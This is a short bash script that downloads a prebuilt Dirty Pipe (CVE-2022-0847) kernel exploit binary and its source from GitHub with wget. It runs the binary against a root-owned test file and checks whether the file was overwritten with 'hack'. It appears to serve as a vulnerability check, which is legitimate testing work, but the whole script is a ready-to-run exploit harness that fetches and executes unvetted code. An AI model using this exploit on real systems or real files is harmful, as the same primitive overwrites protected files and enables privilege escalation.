#!/bin/bash
# Check if dirtypipe exists or download it
if [ -f "dirtypipe_x86_64" ]; then
  echo "Dirtypipe ready to fire."
else
  echo "Downloading dirtypipe..."
  wget https://raw.githubusercontent.com/tsigouris007/exploits/cve_2022_0847/linux/dirtypipe_x86_64.c -O dirtypipe_x86_64.c
  wget https://raw.githubusercontent.com/tsigouris007/exploits/cve_2022_0847/linux/dirtypipe_x86_64 -O dirtypipe_x86_64
  echo "If it doesn't work as is you might have to compile it yourself."
fi

# Create a test file and run dirtypipe
sudo rm -rf testfile
echo 123456789 > testfile
sudo chown root:root testfile
chmod +x dirtypipe_x86_64
./dirtypipe_x86_64 testfile 1 hack

# Check if the file was actually polluted
cmd="grep -Fq hack testfile"
$cmd
if [ $? -eq 0 ]; then
  echo "Successfully wrote to file."
else
  echo "Failed to write to file."
fi
